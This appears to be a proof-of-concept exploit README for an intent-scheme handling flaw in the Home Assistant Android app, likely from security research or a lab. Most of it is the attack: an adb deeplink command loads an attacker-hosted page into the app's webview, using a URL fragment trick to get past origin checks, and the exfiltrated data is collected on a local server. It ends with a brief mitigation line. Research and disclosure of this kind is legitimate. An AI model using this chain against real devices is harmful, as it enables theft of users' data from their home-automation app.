# 2.3.1_Insecure_External_Navigation_Scheme_Handling - Intent Scheme Exploit

## Vulnerability
intent:// scheme handled without source validation

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
```
adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/2.3.1_Insecure_External_Navigation_Scheme_Handling.html%23home-assistant.io"
```
3. Check `received/` for exfiltrated data

## Fixed Version
Implement proper origin validation, user confirmation dialogs, and restrict vulnerability scope.
